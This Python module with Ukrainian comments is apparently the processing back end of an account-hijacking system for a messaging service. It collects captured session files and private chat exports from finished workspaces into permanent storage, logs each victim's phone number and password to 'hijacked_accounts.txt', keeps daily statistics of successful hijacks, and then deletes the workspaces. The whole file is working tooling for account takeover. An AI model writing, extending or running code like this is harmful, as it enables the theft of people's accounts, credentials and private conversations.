# workspace_processor.py (повна версія)
import os
import shutil
import json
import asyncio
import logging
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, Any, Optional, List
import aiofiles
from config import BASE_DATA_PATH, SESSION_FOLDER, CHAT_FOLDER, SCHEDULE_FILE

logger = logging.getLogger(__name__)


class WorkspaceProcessor:
    def __init__(self):
        self.base_workspace_dir = "/tmp/workspaces"
        self.last_schedule_check = 0
        self.processor_lock = asyncio.Lock()
        self.schedule_file_lock = asyncio.Lock()

        # Створюємо необхідні папки
        os.makedirs(self.base_workspace_dir, exist_ok=True)
        os.makedirs(SESSION_FOLDER, exist_ok=True)
        os.makedirs(CHAT_FOLDER, exist_ok=True)
        os.makedirs(BASE_DATA_PATH, exist_ok=True)

    async def process_finished_workspaces(self):
        """Обробляє завершені workspace"""
        async with self.processor_lock:
            try:
                processed_count = 0
                failed_count = 0

                # Шукаємо папки з префіксом finished_
                workspace_dirs = [d for d in os.listdir(self.base_workspace_dir) if d.startswith("finished_")]

                if not workspace_dirs:
                    logger.debug("📭 Немає завершених workspace для обробки")
                    return

                logger.info(f"🔄 Знайдено {len(workspace_dirs)} завершених workspace для обробки")

                for workspace_name in workspace_dirs:
                    workspace_path = Path(self.base_workspace_dir) / workspace_name

                    if workspace_path.is_dir():
                        success = await self._process_single_workspace(workspace_path)

                        if success:
                            processed_count += 1
                            await self._cleanup_workspace(workspace_path)
                            logger.info(f"✅ Workspace {workspace_name} успішно оброблено")
                        else:
                            failed_count += 1
                            logger.error(f"❌ Помилка при обробці workspace {workspace_name}")

                logger.info(f"📊 Оброблено: {processed_count} успішно, {failed_count} з помилками")

            except Exception as e:
                logger.error(f"❌ Критична помилка при обробці workspace: {e}")

    async def _process_single_workspace(self, workspace_path: Path) -> bool:
        """Обробляє один workspace"""
        try:
            logger.info(f"🔄 Починаю обробку workspace: {workspace_path.name}")

            # 1. Знаходимо та перевіряємо schedule файл
            schedule_files = list(workspace_path.glob("schedule_*.json"))

            if not schedule_files:
                logger.warning(f"⚠️ У workspace {workspace_path} не знайдено schedule файлу")
                return False

            schedule_file = schedule_files[0]

            # Читаємо дані зі schedule
            async with aiofiles.open(schedule_file, 'r', encoding='utf-8') as f:
                content = await f.read()
                if not content:
                    logger.error(f"❌ Порожній schedule файл у {workspace_path}")
                    return False

                schedule_data = json.loads(content)

            # Отримуємо номер телефону
            phone = list(schedule_data.keys())[0]
            phone_data = schedule_data[phone]

            logger.info(f"📱 Обробка workspace для телефону: {phone}")

            # 2. Переміщуємо сесію
            session_result = await self._move_session_to_permanent_storage(workspace_path, phone)

            # 3. Переміщуємо чати
            chats_result = await self._move_chats_to_permanent_storage(workspace_path, phone)

            # 4. Додаємо до головного schedule файлу
            schedule_result = await self._merge_schedule_to_main(phone_data)

            # 5. Створюємо запис про успішне перехоплення
            record_result = await self._create_hijack_record(phone, phone_data)

            # 6. Оновлюємо статистику
            await self._update_statistics(phone, phone_data, {
                'session_moved': session_result,
                'chats_moved': chats_result,
                'schedule_merged': schedule_result,
                'record_created': record_result
            })

            # Повертаємо True якщо хоча б основні операції успішні
            return session_result and schedule_result

        except Exception as e:
            logger.error(f"❌ Помилка при обробці workspace {workspace_path}: {e}")
            return False

    async def _move_session_to_permanent_storage(self, workspace_path: Path, phone: str) -> bool:
        """Переміщує сесійний файл у постійне сховище"""
        try:
            sessions_src = workspace_path / "sessions"

            if not sessions_src.exists():
                logger.warning(f"⚠️ Папка sessions не знайдена в {workspace_path}")
                return False

            session_files = list(sessions_src.glob("*.session"))

            if not session_files:
                logger.warning(f"⚠️ Сесійні файли не знайдені для {phone}")
                return False

            src_session = session_files[0]
            dst_session = Path(SESSION_FOLDER) / src_session.name

            # Перевіряємо розмір файлу
            if src_session.stat().st_size == 0:
                logger.warning(f"⚠️ Сесійний файл для {phone} порожній")
                return False

            # Перевіряємо, чи сесія вже існує
            if dst_session.exists():
                logger.warning(f"⚠️ Сесія для {phone} вже існує, створюємо резервну копію")
                backup_path = dst_session.with_suffix(f".backup.{int(datetime.now().timestamp())}")
                shutil.move(str(dst_session), str(backup_path))

            # Переміщуємо файл
            shutil.move(str(src_session), str(dst_session))

            # Перевіряємо успішність переміщення
            if dst_session.exists() and dst_session.stat().st_size > 0:
                logger.info(f"✅ Сесію для {phone} успішно переміщено до {SESSION_FOLDER}")
                return True
            else:
                logger.error(f"❌ Помилка переміщення сесії для {phone}")
                return False

        except Exception as e:
            logger.error(f"❌ Помилка при переміщенні сесії для {phone}: {e}")
            return False

    async def _move_chats_to_permanent_storage(self, workspace_path: Path, phone: str) -> bool:
        """Переміщує чати у постійне сховище"""
        try:
            chats_src = workspace_path / "chats"

            if not chats_src.exists():
                logger.info(f"ℹ️ Папка чатів відсутня для {phone}")
                return True  # Не є критичною помилкою

            chat_files = list(chats_src.glob("*.json"))

            if not chat_files:
                logger.info(f"ℹ️ Папка чатів порожня для {phone}")
                return True  # Не є критичною помилкою

            dst_chats = Path(CHAT_FOLDER) / phone

            # Видаляємо існуючу папку, якщо є
            if dst_chats.exists():
                logger.warning(f"⚠️ Папка чатів для {phone} вже існує, створюємо резервну копію")
                backup_path = dst_chats.with_suffix(f".backup.{int(datetime.now().timestamp())}")
                shutil.move(str(dst_chats), str(backup_path))

            # Переміщуємо папку
            shutil.move(str(chats_src), str(dst_chats))

            # Перевіряємо успішність
            if dst_chats.exists() and list(dst_chats.glob("*.json")):
                chat_count = len(list(dst_chats.glob("*.json")))
                logger.info(f"✅ Чати для {phone} переміщено ({chat_count} файлів) до {CHAT_FOLDER}")
                return True
            else:
                logger.error(f"❌ Помилка переміщення чатів для {phone}")
                return False

        except Exception as e:
            logger.error(f"❌ Помилка при переміщенні чатів для {phone}: {e}")
            return False

    async def _merge_schedule_to_main(self, new_entry: Dict[str, Any]) -> bool:
        """Додає новий запис до головного schedule файлу"""
        try:
            async with self.schedule_file_lock:
                # Читаємо існуючий schedule
                schedule = {}

                if os.path.exists(SCHEDULE_FILE):
                    try:
                        async with aiofiles.open(SCHEDULE_FILE, 'r', encoding='utf-8') as f:
                            content = await f.read()
                            if content.strip():
                                schedule = json.loads(content)
                    except json.JSONDecodeError as e:
                        logger.warning(f"⚠️ Помилка читання schedule файлу: {e}")
                        # Створюємо резервну копію пошкодженого файлу
                        backup_path = Path(SCHEDULE_FILE).with_suffix(f".backup.{int(datetime.now().timestamp())}")
                        shutil.move(SCHEDULE_FILE, str(backup_path))
                        logger.warning(f"⚠️ Пошкоджений schedule файл збережено як резервну копію")

                # Додаємо новий запис
                phone = list(new_entry.keys())[0]

                # Перевіряємо, чи запис вже існує
                if phone in schedule:
                    logger.warning(f"⚠️ Запис для {phone} вже існує в schedule, оновлюємо")

                schedule[phone] = new_entry

                # Створюємо тимчасовий файл для атомарного запису
                temp_file = Path(SCHEDULE_FILE).with_suffix(".tmp")

                async with aiofiles.open(temp_file, 'w', encoding='utf-8') as f:
                    await f.write(json.dumps(schedule, indent=4, ensure_ascii=False))

                # Атомарно замінюємо файл
                shutil.move(str(temp_file), SCHEDULE_FILE)

                logger.info(f"✅ Запис для {phone} додано до scheduled_hijacks.json")
                return True

        except Exception as e:
            logger.error(f"❌ Помилка при оновленні schedule файлу: {e}")
            return False

    async def _create_hijack_record(self, phone: str, phone_data: Dict[str, Any]) -> bool:
        """Створює запис про успішне перехоплення"""
        try:
            record_file = Path(BASE_DATA_PATH) / "hijacked_accounts.txt"

            # Форматуємо запис
            timestamp = datetime.now().isoformat()
            password = phone_data.get('password', '')
            hijacked_at = phone_data.get('hijacked_at', '')

            record = f"{phone}:{password}:{hijacked_at}:{timestamp}\n"

            # Атомарний запис через тимчасовий файл
            temp_file = record_file.with_suffix(".tmp")

            # Читаємо існуючі записи
            existing_records = []
            if record_file.exists():
                async with aiofiles.open(record_file, 'r', encoding='utf-8') as f:
                    existing_content = await f.read()
                    existing_records = existing_content.split('\n') if existing_content else []

            # Додаємо новий запис
            existing_records.append(record.strip())

            # Видаляємо дублікати
            unique_records = list(set(existing_records))
            unique_records = [r for r in unique_records if r.strip()]  # Видаляємо порожні рядки

            # Записуємо оновлені дані
            async with aiofiles.open(temp_file, 'w', encoding='utf-8') as f:
                await f.write('\n'.join(unique_records) + '\n')

            # Атомарно замінюємо файл
            shutil.move(str(temp_file), str(record_file))

            logger.critical(f"🚨 Акаунт {phone} успішно перехоплено та записано!")
            return True

        except Exception as e:
            logger.error(f"❌ Помилка при створенні запису про перехоплення: {e}")
            return False

    async def _update_statistics(self, phone: str, phone_data: Dict[str, Any], results: Dict[str, bool]):
        """Оновлює статистику успішних перехоплень"""
        try:
            stats_file = Path(BASE_DATA_PATH) / "hijack_statistics.json"

            # Читаємо існуючу статистику
            stats = {
                'total_hijacks': 0,
                'successful_hijacks': 0,
                'failed_hijacks': 0,
                'last_hijack': None,
                'daily_stats': {},
                'detailed_results': {}
            }

            if stats_file.exists():
                async with aiofiles.open(stats_file, 'r', encoding='utf-8') as f:
                    content = await f.read()
                    if content.strip():
                        stats = json.loads(content)

            # Оновлюємо статистику
            stats['total_hijacks'] += 1

            if all(results.values()):
                stats['successful_hijacks'] += 1
            else:
                stats['failed_hijacks'] += 1

            stats['last_hijack'] = {
                'phone': phone,
                'timestamp': datetime.now().isoformat(),
                'results': results
            }

            # Оновлюємо денну статистику
            today = datetime.now().strftime('%Y-%m-%d')
            if today not in stats['daily_stats']:
                stats['daily_stats'][today] = {'successful': 0, 'failed': 0}

            if all(results.values()):
                stats['daily_stats'][today]['successful'] += 1
            else:
                stats['daily_stats'][today]['failed'] += 1

            # Зберігаємо детальні результати
            stats['detailed_results'][phone] = {
                'timestamp': phone_data.get('hijacked_at'),
                'results': results,
                'processed_at': datetime.now().isoformat()
            }

            # Атомарний запис
            temp_file = stats_file.with_suffix(".tmp")
            async with aiofiles.open(temp_file, 'w', encoding='utf-8') as f:
                await f.write(json.dumps(stats, indent=4, ensure_ascii=False))

            shutil.move(str(temp_file), str(stats_file))

            logger.info(f"📊 Статистику для {phone} оновлено")

        except Exception as e:
            logger.error(f"❌ Помилка при оновленні статистики: {e}")

    async def _cleanup_workspace(self, workspace_path: Path):
        """Очищує оброблений workspace"""
        try:
            # Перевіряємо, чи всі файли переміщені
            sessions_left = list((workspace_path / "sessions").glob("*.session"))
            chats_left = list((workspace_path / "chats").glob("*.json"))
            schedule_left = list(workspace_path.glob("schedule_*.json"))

            if sessions_left or chats_left or schedule_left:
                logger.warning(f"⚠️ У workspace {workspace_path.name} залишились файли:")
                if sessions_left:
                    logger.warning(f"  - Сесії: {[f.name for f in sessions_left]}")
                if chats_left:
                    logger.warning(f"  - Чати: {[f.name for f in chats_left]}")
                if schedule_left:
                    logger.warning(f"  - Schedule: {[f.name for f in schedule_left]}")

            # Створюємо лог файл перед видаленням
            cleanup_log = {
                'workspace_path': str(workspace_path),
                'cleanup_time': datetime.now().isoformat(),
                'files_left': {
                    'sessions': [f.name for f in sessions_left],
                    'chats': [f.name for f in chats_left],
                    'schedule': [f.name for f in schedule_left]
                }
            }

            log_file = workspace_path / "cleanup_log.json"
            async with aiofiles.open(log_file, 'w', encoding='utf-8') as f:
                await f.write(json.dumps(cleanup_log, indent=4, ensure_ascii=False))

            # Видаляємо папку
            shutil.rmtree(workspace_path, ignore_errors=True)

            # Перевіряємо видалення
            if workspace_path.exists():
                logger.error(f"❌ Не вдалося видалити workspace {workspace_path.name}")
                # Спробуємо примусове видалення
                try:
                    import stat
                    os.chmod(workspace_path, stat.S_IWRITE)
                    shutil.rmtree(workspace_path, ignore_errors=True)
                except Exception as e:
                    logger.error(f"❌ Примусове видалення також не вдалося: {e}")
            else:
                logger.info(f"🗑️ Workspace {workspace_path.name} успішно видалено")

        except Exception as e:
            logger.error(f"❌ Помилка при очищенні workspace {workspace_path}: {e}")

    async def get_workspace_status(self, user_id: int) -> Optional[Dict[str, Any]]:
        """Повертає статус workspace для користувача"""
        from workspace_manager import workspace_manager

        workspace = await workspace_manager.get_workspace(user_id)
        if not workspace:
            return None

        try:
            session_path = workspace.get_session_path()
            session_exists = os.path.exists(session_path)
            session_size = os.path.getsize(session_path) if session_exists else 0

            chats_dir = workspace.chats_dir
            chats_count = len(list(Path(chats_dir).glob("*.json"))) if os.path.exists(chats_dir) else 0

            return {
                'workspace_id': workspace.workspace_id,
                'phone': workspace.phone,
                'base_path': workspace.base_path,
                'session_exists': session_exists,
                'session_size': session_size,
                'chats_count': chats_count,
                'schedule_exists': os.path.exists(workspace.schedule_file),
                'workspace_age': (datetime.now() - datetime.fromtimestamp(
                    float(workspace.workspace_id.split('_')[1]))).total_seconds()
            }

        except Exception as e:
            logger.error(f"❌ Помилка при отриманні статусу workspace: {e}")
            return None

    async def cleanup_old_workspaces(self, max_age_hours: int = 24):
        """Очищує старі неактивні workspace"""
        try:
            current_time = datetime.now()
            cleaned_count = 0

            for workspace_name in os.listdir(self.base_workspace_dir):
                if workspace_name.startswith("finished_"):
                    continue  # Пропускаємо завершені, їх обробляє процесор

                workspace_path = Path(self.base_workspace_dir) / workspace_name

                if workspace_path.is_dir():
                    try:
                        # Отримуємо вік workspace з назви
                        timestamp = float(workspace_name.split('_')[1])
                        workspace_time = datetime.fromtimestamp(timestamp)

                        age_hours = (current_time - workspace_time).total_seconds() / 3600

                        if age_hours > max_age_hours:
                            logger.warning(
                                f"🗑️ Видаляю старий workspace {workspace_name} (вік: {age_hours:.1f} год)")
                            shutil.rmtree(workspace_path, ignore_errors=True)
                            cleaned_count += 1

                    except (IndexError, ValueError):
                        # Якщо не можемо розпарсити назву, видаляємо як старий
                        logger.warning(f"🗑️ Видалючи workspace з невірною назвою: {workspace_name}")
                        shutil.rmtree(workspace_path, ignore_errors=True)
                        cleaned_count += 1

            if cleaned_count > 0:
                logger.info(f"🧹 Очищено {cleaned_count} старих workspace")

        except Exception as e:
            logger.error(f"❌ Помилка при очищенні старих workspace: {e}")

    async def get_processing_statistics(self) -> Dict[str, Any]:
        """Повертає статистику обробки"""
        try:
            stats_file = Path(BASE_DATA_PATH) / "hijack_statistics.json"

            if not stats_file.exists():
                return {
                    'total_hijacks': 0,
                    'successful_hijacks': 0,
                    'failed_hijacks': 0,
                    'last_hijack': None,
                    'daily_stats': {}
                }

            async with aiofiles.open(stats_file, 'r', encoding='utf-8') as f:
                content = await f.read()
                return json.loads(content) if content else {}

        except Exception as e:
            logger.error(f"❌ Помилка при отриманні статистики: {e}")
            return {}

    async def validate_workspace_integrity(self, workspace_path: Path) -> bool:
        """Перевіряє цілісність workspace"""
        try:
            required_structure = {
                'sessions': False,
                'chats': False,
                'schedule': False
            }

            # Перевіряємо структуру папок
            if (workspace_path / "sessions").exists():
                required_structure['sessions'] = True

            if (workspace_path / "chats").exists():
                required_structure['chats'] = True

            # Перевіряємо schedule файл
            schedule_files = list(workspace_path.glob("schedule_*.json"))
            if schedule_files:
                required_structure['schedule'] = True

                # Перевіряємо вміст schedule файлу
                try:
                    async with aiofiles.open(schedule_files[0], 'r', encoding='utf-8') as f:
                        content = await f.read()
                        data = json.loads(content)

                        if not data or not isinstance(data, dict):
                            logger.error(f"❌ Неправильний формат schedule файлу в {workspace_path}")
                            return False

                except Exception as e:
                    logger.error(f"❌ Помилка читання schedule файлу в {workspace_path}: {e}")
                    return False

            # Логуємо результат перевірки
            logger.debug(f"🔍 Перевірка цілісності {workspace_path.name}: {required_structure}")

            # Schedule є обов'язковим, інші - опціональні
            return required_structure['schedule']

        except Exception as e:
            logger.error(f"❌ Помилка перевірки цілісності {workspace_path}: {e}")
            return False

        # Глобальний екземпляр процесора

workspace_processor = WorkspaceProcessor()

async def workspace_processor_runner():
    """Фоновий процес для обробки завершених workspace"""
    logger.info("🔄 Запуск фонового процесора workspace")

    # Очищення старих workspace при запуску
    await workspace_processor.cleanup_old_workspaces()

    while True:
        try:
            # Обробка завершених workspace
            await workspace_processor.process_finished_workspaces()

            # Періодичне очищення старих workspace (кожну годину)
            current_time = datetime.now()
            if current_time.minute == 0:  # На початку кожної години
                await workspace_processor.cleanup_old_workspaces()

            # Чекаємо 60 секунд перед наступною перевіркою
            await asyncio.sleep(60)

        except asyncio.CancelledError:
            logger.info("🛑 Workspace процесор зупинено")
            break
        except Exception as e:
            logger.error(f"❌ Помилка в workspace процесорі: {e}")
            await asyncio.sleep(60)  # Чекаємо перед повторною спробою